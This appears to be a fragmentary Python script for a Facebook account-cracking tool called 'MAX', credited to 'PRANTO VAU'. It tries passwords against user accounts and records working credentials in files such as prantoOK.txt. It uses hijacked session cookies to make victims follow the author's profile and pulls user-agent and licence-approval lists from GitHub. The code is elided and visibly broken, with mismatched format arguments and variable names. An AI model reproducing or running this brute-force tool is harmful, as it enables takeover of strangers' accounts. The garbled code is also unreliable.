...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mKTM_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mKTM_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back KTM  Menu ")
	    Sad_Boy()
...
class __xxx__:
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [pranto-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('prantoOK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [pranto-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('pranto_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100080861812614', cookies={'cookie': coki}).text, 'html.parser')
...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100080861812614/ ')
try:
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/prantovau55-Cyber/user-agnet/blob/main/mix.txt').text
		ua=open('.mix.txt','w')
...
def FOFALWAYSONFIRE():
  ...
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/prantovau55/BD/blob/main/APPROVAL.txt').text
...
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 ...
 Github    : PRANTOVAU55
 Facebook  : PRANTO VAU
  Tool Name : \033[1;3mMAX\033[1;37m
 Tool Type : \033[1;31mTRIAL\033[1;37m
